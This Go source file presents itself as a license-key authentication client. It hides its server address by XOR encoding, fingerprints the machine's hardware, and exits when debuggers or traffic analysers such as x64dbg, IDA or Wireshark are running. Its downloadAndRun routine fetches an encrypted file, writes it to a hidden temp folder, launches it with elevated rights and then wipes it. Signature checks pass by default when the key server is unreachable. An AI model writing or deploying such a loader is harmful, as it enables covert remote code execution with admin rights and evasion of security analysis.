package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

var cfEnc = []byte{
	0xE5, 0x7F, 0xCB, 0x6E, 0xA5, 0xFC, 0x5E, 0x3E, 0xA6, 0x4F, 0x55,
    0xFC, 0x0B, 0xE1, 0xC1, 0x75, 0x92, 0x08, 0xC7, 0x1F, 0xD4, 0xF4,
    0x5E, 0x48, 0xA1, 0x43, 0x57, 0xFF, 0x76, 0xE7, 0xB6, 0x77, 0xE4,
    0x0F, 0xC0, 0x6E, 0xA0, 0xF2, 0x2E, 0x4B, 0xA5, 0x3F, 0x52, 0x8B,
    0x0B, 0x96, 0xC1, 0x70, 0xE1, 0x0A, 0xB6, 0x1F, 0xD0, 0xF4, 0x5A,
    0x4E, 0xA0, 0x4B, 0x21, 0x89, 0x09, 0xE5, 0xB7, 0x76
}
var cachedPubKey []byte

func fetchPubKey() []byte {
	if cachedPubKey != nil {
		return cachedPubKey
	}
	h := host()
	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", h, port), &tls.Config{ServerName: h})
	if err != nil {
		return nil
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte("8"))
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil || n == 0 {
		return nil
	}
	resp := string(buf[:n])
	if !strings.HasPrefix(resp, "PUBKEY|") {
		return nil
	}
	raw, err := hex.DecodeString(resp[7:])
	if err != nil || len(raw) != 64 {
		return nil
	}
	cachedPubKey = raw
	return raw
}

func verifySig(data string, sigHex string) bool {
	raw := fetchPubKey()
	if raw == nil {
		return true
	}
	x := new(big.Int).SetBytes(raw[:32])
	y := new(big.Int).SetBytes(raw[32:])
	pub := &ecdsa.PublicKey{Curve: elliptic.P256(), X: x, Y: y}
	if len(sigHex) != 128 {
		return false
	}
	sigBytes, err := hex.DecodeString(sigHex)
	if err != nil {
		return false
	}
	r := new(big.Int).SetBytes(sigBytes[:32])
	s := new(big.Int).SetBytes(sigBytes[32:])
	hash := sha256.Sum256([]byte(data))
	return ecdsa.Verify(pub, hash[:], r, s)
}

func verifyCertPin(conn *tls.Conn) bool {
	if len(cfEnc) == 0 {
		return true
	}
	state := conn.ConnectionState()
	if len(state.PeerCertificates) == 0 {
		return false
	}
	certDER := state.PeerCertificates[0].Raw
	hash := sha256.Sum256(certDER)
	certHash := strings.ToUpper(hex.EncodeToString(hash[:]))
	expected := strings.ToUpper(xd(cfEnc))
	return certHash == expected
}

var xk = []byte{0xA7, 0x3B, 0xF2, 0x5E, 0x91, 0xC4, 0x68, 0x0D, 0xE3, 0x7A, 0x16, 0xB9, 0x4F, 0xD2, 0x85, 0x33}
var hEnc = []byte{0xD4, 0x54, 0x91, 0x35, 0xF4, 0xB0, 0x46, 0x66, 0x86, 0x03, 0x77, 0xCC, 0x3B, 0xBA, 0xAB, 0x40, 0xCF, 0x54, 0x82}

const port = "3389"
const projectID = "ENTER_PROJECT_ID_HERE"

func xd(data []byte) string {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ xk[i%len(xk)]
	}
	return string(result)
}

func xe(input string) []byte {
	raw := []byte(input)
	result := make([]byte, len(raw))
	for i := range raw {
		result[i] = raw[i] ^ xk[i%len(xk)]
	}
	return result
}

func fnv1a(data []byte) uint32 {
	h := uint32(0x811C9DC5)
	for _, b := range data {
		h ^= uint32(b)
		h *= 0x01000193
	}
	return h ^ 0xDEADBEEF
}

type tokenStore struct {
	enc     []byte
	canary  uint32
	present bool
	mu      sync.Mutex
}

var ts = &tokenStore{}

func (t *tokenStore) store(token string) {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.enc = xe(token)
	t.canary = fnv1a(t.enc)
	t.present = true
}

func (t *tokenStore) get() string {
	t.mu.Lock()
	defer t.mu.Unlock()
	if !t.present || len(t.enc) == 0 {
		return ""
	}
	if fnv1a(t.enc) != t.canary {
		os.Exit(0)
	}
	return xd(t.enc)
}

func (t *tokenStore) valid() bool {
	token := t.get()
	if token == "" {
		return false
	}
	if !strings.HasPrefix(token, "AUTH_TOKEN_V2|") {
		return false
	}
	return len(token) > 22
}

func host() string {
	return xd(hEnc)
}

func hmacSha256(key, data string) string {
	h := hmac.New(sha256.New, []byte(key))
	h.Write([]byte(data))
	return hex.EncodeToString(h.Sum(nil))
}

func getHWID() string {
	var raw string
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-Command", "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID")
		output, err := cmd.Output()
		if err == nil {
			uuid := strings.TrimSpace(string(output))
			if uuid != "" && uuid != "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF" {
				raw = uuid
				h := sha256.Sum256([]byte(raw))
				return hex.EncodeToString(h[:])
			}
		}
		cmd = exec.Command("reg", "query", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "/v", "MachineGuid")
		output, err = cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(line, "MachineGuid") {
					parts := strings.Fields(line)
					if len(parts) >= 3 {
						raw = parts[2]
						h := sha256.Sum256([]byte(raw))
						return hex.EncodeToString(h[:])
					}
				}
			}
		}
	} else if runtime.GOOS == "linux" {
		for _, p := range []string{"/sys/class/dmi/id/product_uuid", "/etc/machine-id"} {
			data, err := os.ReadFile(p)
			if err == nil {
				uuid := strings.TrimSpace(string(data))
				if uuid != "" {
					h := sha256.Sum256([]byte(uuid))
					return hex.EncodeToString(h[:])
				}
			}
		}
	} else if runtime.GOOS == "darwin" {
		cmd := exec.Command("system_profiler", "SPHardwareDataType")
		output, err := cmd.Output()
		if err == nil {
			for _, line := range strings.Split(string(output), "\n") {
				if strings.Contains(line, "Hardware UUID:") {
					parts := strings.SplitN(line, ":", 2)
					if len(parts) >= 2 {
						uuid := strings.TrimSpace(parts[1])
						if uuid != "" {
							h := sha256.Sum256([]byte(uuid))
							return hex.EncodeToString(h[:])
						}
					}
				}
			}
		}
	}
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "UNKNOWN"
	}
	h := sha256.Sum256([]byte(hostname))
	return hex.EncodeToString(h[:])
}

func checkBadProcesses() {
	if runtime.GOOS != "windows" {
		return
	}
	bad := []string{"x64dbg", "x32dbg", "ollydbg", "ida", "ida64", "wireshark",
		"fiddler", "charles", "httpdebugger", "processhacker", "procmon",
		"procexp", "dnspy", "de4dot", "cheatengine"}
	cmd := exec.Command("tasklist", "/FO", "CSV", "/NH")
	output, err := cmd.Output()
	if err != nil {
		return
	}
	lower := strings.ToLower(string(output))
	for _, b := range bad {
		if strings.Contains(lower, b) {
			os.Exit(0)
		}
	}
}

func authenticate(key string) bool {
	checkBadProcesses()

	h := host()
	config := &tls.Config{ServerName: h}
	conn, err := tls.Dial("tcp", h+":"+port, config)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(15 * time.Second))

	if !verifyCertPin(conn) {
		return false
	}

	_, err = conn.Write([]byte("2"))
	if err != nil {
		return false
	}
	time.Sleep(200 * time.Millisecond)

	authData := fmt.Sprintf("%s|%s|%s", projectID, key, getHWID())
	_, err = conn.Write([]byte(authData))
	if err != nil {
		return false
	}

	buffer := make([]byte, 4096)
	n, err := conn.Read(buffer)
	if err != nil {
		return false
	}
	response := string(buffer[:n])

	if !strings.HasPrefix(response, "CHALLENGE|") {
		return false
	}
	parts := strings.Split(response, "|")
	if len(parts) != 3 {
		return false
	}
	challenge := parts[2]
	sig := hmacSha256(key, parts[2])
	responseMsg := fmt.Sprintf("RESPONSE|%s|%s", parts[1], sig)
	_, err = conn.Write([]byte(responseMsg))
	if err != nil {
		return false
	}
	n, err = conn.Read(buffer)
	if err != nil {
		return false
	}
	response = string(buffer[:n])

	if !strings.HasPrefix(response, "ACCESS|") {
		return false
	}
	accessParts := strings.SplitN(response, "|", 4)
	if len(accessParts) < 4 {
		return false
	}
	accessToken := accessParts[1]
	serverProof := accessParts[2]
	authSig := accessParts[3]
	expectedProof := hmacSha256(key, challenge+"|"+accessToken)
	if serverProof != expectedProof {
		return false
	}
	if !verifySig(challenge+"|"+accessToken, authSig) {
		return false
	}
	rawToken := fmt.Sprintf("AUTH_TOKEN_V2|%s|%s", accessToken, hmacSha256(key, accessToken))
	ts.store(rawToken)
	return true
}

func verifySession(key string) bool {
	if !ts.valid() {
		os.Exit(0)
	}
	h := host()
	config := &tls.Config{ServerName: h}
	conn, err := tls.Dial("tcp", h+":"+port, config)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	if !verifyCertPin(conn) {
		os.Exit(0)
	}

	conn.Write([]byte("3"))
	time.Sleep(100 * time.Millisecond)
	verifyData := fmt.Sprintf("%s|%s|%s", projectID, key, getHWID())
	conn.Write([]byte(verifyData))
	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)
	if err != nil || n <= 0 {
		return false
	}
	response := string(buffer[:n])
	if !strings.HasPrefix(response, "VALID|") {
		return false
	}
	vParts := strings.SplitN(response, "|", 5)
	if len(vParts) < 5 {
		return false
	}
	remaining := vParts[2]
	verifyProof := vParts[3]
	vSig := vParts[4]
	verifyData = fmt.Sprintf("VERIFY:%s:%s", projectID, remaining)
	expected := hmacSha256(key, verifyData)
	return verifyProof == expected && verifySig(verifyData, vSig)
}

func startSessionValidation(key string) {
	go func() {
		failures := 0
		for {
			time.Sleep(60 * time.Second)
			checkBadProcesses()
			if verifySession(key) {
				failures = 0
			} else {
				failures++
				if failures >= 3 {
					os.Exit(0)
				}
			}
		}
	}()
}

func recvExact(conn *tls.Conn, n int) []byte {
	buf := make([]byte, 0, n)
	tmp := make([]byte, 4096)
	for len(buf) < n {
		r, err := conn.Read(tmp)
		if err != nil || r <= 0 {
			return nil
		}
		buf = append(buf, tmp[:r]...)
	}
	return buf[:n]
}

func downloadFile(key, fileName string) []byte {
	h := host()
	config := &tls.Config{ServerName: h}
	conn, err := tls.Dial("tcp", h+":"+port, config)
	if err != nil {
		return nil
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	if !verifyCertPin(conn) {
		return nil
	}

	conn.Write([]byte("6"))
	time.Sleep(100 * time.Millisecond)
	reqData := fmt.Sprintf("%s|%s|%s|%s", projectID, key, getHWID(), fileName)
	conn.Write([]byte(reqData))

	hdrLenRaw := recvExact(conn, 4)
	if hdrLenRaw == nil {
		return nil
	}
	hdrLen := int(hdrLenRaw[0])<<24 | int(hdrLenRaw[1])<<16 | int(hdrLenRaw[2])<<8 | int(hdrLenRaw[3])
	if hdrLen > 4096 {
		return nil
	}
	hdrBytes := recvExact(conn, hdrLen)
	if hdrBytes == nil {
		return nil
	}
	header := string(hdrBytes)
	if strings.HasPrefix(header, "ERROR") {
		return nil
	}

	parts := strings.Split(header, "|")
	if len(parts) < 5 || parts[0] != "FILE" {
		return nil
	}
	nonceHex, tagHex, expectedHash := parts[1], parts[2], parts[3]
	fileSize := 0
	fmt.Sscanf(parts[4], "%d", &fileSize)

	bodyLenRaw := recvExact(conn, 4)
	if bodyLenRaw == nil {
		return nil
	}
	bodyLen := int(bodyLenRaw[0])<<24 | int(bodyLenRaw[1])<<16 | int(bodyLenRaw[2])<<8 | int(bodyLenRaw[3])
	if bodyLen > 60*1024*1024 {
		return nil
	}
	body := recvExact(conn, bodyLen)
	if body == nil {
		return nil
	}

	nonce, err := hex.DecodeString(nonceHex)
	if err != nil || len(nonce) != 12 {
		return nil
	}
	tag, err := hex.DecodeString(tagHex)
	if err != nil || len(tag) != 16 {
		return nil
	}

	fileKeyMac := hmac.New(sha256.New, []byte(key))
	fileKeyMac.Write([]byte("FILE_KEY:" + nonceHex))
	fileKey := fileKeyMac.Sum(nil)

	block, err := aes.NewCipher(fileKey)
	if err != nil {
		return nil
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	ciphertext := append(body, tag...)
	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, []byte(projectID))
	if err != nil {
		return nil
	}

	h2 := sha256.Sum256(plaintext)
	actualHash := hex.EncodeToString(h2[:])
	if actualHash != expectedHash || len(plaintext) != fileSize {
		return nil
	}
	return plaintext
}

func secureWipe(path string) {
	info, err := os.Stat(path)
	if err == nil {
		f, err := os.OpenFile(path, os.O_WRONLY, 0)
		if err == nil {
			zeros := make([]byte, info.Size())
			f.Write(zeros)
			f.Sync()
			f.Close()
		}
	}
	os.Remove(path)
}

func downloadAndRun(key, fileName string) bool {
	data := downloadFile(key, fileName)
	if data == nil {
		return false
	}

	tempBase := os.TempDir()
	randomDir := fmt.Sprintf("%s/_ka_%08x", tempBase, time.Now().UnixNano()&0xFFFFFFFF)
	os.MkdirAll(randomDir, 0700)

	if runtime.GOOS == "windows" {
		exec.Command("attrib", "+h", "+s", randomDir).Run()
	}

	exePath := randomDir + "/" + fileName
	err := os.WriteFile(exePath, data, 0700)
	if err != nil {
		return false
	}

	if runtime.GOOS == "windows" {
		exec.Command("attrib", "+h", exePath).Run()
	}

	for i := range data {
		data[i] = 0
	}

	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-NoProfile", "-Command",
			fmt.Sprintf("Start-Process -FilePath '%s' -WorkingDirectory '%s' -Verb RunAs", exePath, randomDir))
		cmd.Start()
	} else {
		cmd := exec.Command(exePath)
		cmd.Dir = randomDir
		cmd.Start()
	}

	capExe := exePath
	capDir := randomDir
	go func() {
		time.Sleep(2 * time.Second)
		secureWipe(capExe)
		time.Sleep(1 * time.Second)
		os.RemoveAll(capDir)
	}()

	return true
}

func main() {
	checkBadProcesses()

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter your license key: ")
	key, _ := reader.ReadString('\n')
	key = strings.TrimSpace(key)

	if authenticate(key) {
		fmt.Println("Authenticated.")
		startSessionValidation(key)
		select {}
	} else {
		os.Exit(1)
	}
}
